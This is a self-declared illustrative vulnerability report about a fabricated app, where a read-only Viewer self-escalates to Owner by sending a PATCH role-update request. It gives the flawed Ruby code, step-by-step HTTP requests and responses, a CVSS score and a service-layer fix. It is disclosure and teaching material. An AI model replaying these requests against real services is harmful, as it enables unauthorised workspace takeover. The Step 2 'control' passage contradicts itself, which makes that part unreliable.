# Broken access control: a read-only member can escalate themselves to Owner via the role-update API

> EXAMPLE / DUMMY FINDING — illustrative only. Target, IDs, and code are fabricated.
> Showcases the white-box workflow: trace to the deepest enforcing gate (code review),
> then prove it with a control-vs-bug pair (testing).

## Summary
The membership role-update endpoint authorizes that the caller is *a member* of the workspace,
but never checks that the caller holds a role high enough to **assign** the requested role. A
read-only Viewer can call the API to set their own role to Owner. The web UI hides the control,
so the gap only appears on the raw API.
**Root cause:** `MembershipsController#update` authorizes `member_of_workspace?` (a read-level
check) instead of `can_assign_role?`, and the service layer trusts the controller.

## Severity
`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` = **8.1 (High)**
PR:L (any low-priv member); self-escalation to Owner = full read + write/admin of the
workspace; same workspace authority → S:U.

## Affected / tested versions
- Affected: `app v6.0 – v6.3.2`   Fixed in: `v6.3.3`   Tested build: `v6.3.2`

## Roles involved
- **Attacker:** a **Viewer** (read-only) member of a workspace; entitled to read, nothing more.
- **Policy bypassed:** role assignment is meant to be Owner-only. A Viewer assigning Owner is
  the control this report breaks.

## Preconditions
- Membership in one workspace at the lowest role (Viewer). Invitation/self-join is enough.
- The attacker's own membership ID (returned by `GET /workspaces/:id/members`).

## Mechanism (code-level root cause)
Trace every layer to the binding gate. The controller gate is read-level and the service does
not re-authorize the role change, so nothing enforces the assignment ceiling.

1. **Entry point** — `app/controllers/memberships_controller.rb:19`:
```ruby
# app/controllers/memberships_controller.rb:19
before_action :authorize_member!          # only checks current_user.member_of?(workspace)
def update
  Memberships::UpdateService.new(membership, params[:role]).execute   # passes role straight through
end
```
2. **Service** — `app/services/memberships/update_service.rb:8` — sets `membership.role =
   new_role` and saves. **No `can_assign_role?` / ceiling check.** This is the deepest gate, and
   it is missing.
3. **Policy** — `app/policies/membership_policy.rb` defines `assign_role?` (Owner-only) but it
   is **never called** on this path.

**Proof of intent (sibling control):** the bulk-invite path *does* enforce the ceiling, proving
the single-update path simply omits it:
```ruby
# app/services/memberships/invite_service.rb:21
authorize!(current_user, :assign_role?, workspace)   # enforced here, missing in update_service
```

## Steps to Reproduce
Replace `<host>`, `<token>`, `<workspace>`, `<membership_id>`.

### Part A — setup (one-time, legitimate)
**Step 1.** Join workspace `<workspace>` as a Viewer. Read your membership ID:
```http
GET /workspaces/<workspace>/members HTTP/1.1
Host: <host>
Authorization: Bearer <viewer-token>
```
Note your own `membership_id` and confirm `"role":"viewer"`.

### Part B — exploit
**Step 2 (control — a Viewer cannot assign Owner to someone else).** Try to promote another
member; the ceiling should reject it (and does, on this path is not the bug — it confirms the
intended rule):
```http
PATCH /workspaces/<workspace>/members/<other_membership_id> HTTP/1.1
Host: <host>
Authorization: Bearer <viewer-token>
Content-Type: application/json

{"role":"owner"}
```
> Use this to show the *expected* rule. If your build rejects this but allows Step 3, that
> contrast is the bug. (In the example build, both succeed — see Observed.)

**Step 3 (bug — the Viewer promotes themselves to Owner).**
```http
PATCH /workspaces/<workspace>/members/<membership_id> HTTP/1.1
Host: <host>
Authorization: Bearer <viewer-token>
Content-Type: application/json

{"role":"owner"}
```
```http
HTTP/1.1 200 OK

{"id":<membership_id>,"role":"owner"}
```
> `[SCREENSHOT HERE: 200 + "role":"owner" for the attacker's own membership]`

**Step 4 (confirm — Owner powers now work).** A previously-forbidden Owner action succeeds:
```http
DELETE /workspaces/<workspace>/members/<other_membership_id> HTTP/1.1
Host: <host>
Authorization: Bearer <viewer-token>
```
```http
HTTP/1.1 204 No Content      # was 403 before the escalation
```

## Observed (live)
On `v6.3.2` at `example.com`, Viewer `dave` (membership 88) sent
`PATCH /workspaces/4/members/88 {"role":"owner"}` and got **200 `"role":"owner"`**. He then
deleted another member (**204**) and edited workspace settings (**200**) — actions that
returned **403** before the escalation.

## Impact
Any read-only member self-escalates to Owner of the workspace: full control of members,
settings, and all private data. A single low-privileged invite becomes full workspace takeover,
with no admin action and no UI trace.

## Suggested Fix
Enforce the assignment ceiling at the service layer (the shared gate every caller routes
through), mirroring the invite path:
```ruby
# app/services/memberships/update_service.rb:8
authorize!(current_user, :assign_role?, workspace)   # reject roles above the caller's ceiling
```
Do not rely on the controller-only `authorize_member!` (read-level) or on the UI hiding the
control.

## References
CWE-285 (Improper Authorization) / CWE-269 (Improper Privilege Management).
OWASP A01:2021 (Broken Access Control), API5:2023 (Broken Function Level Authorization).
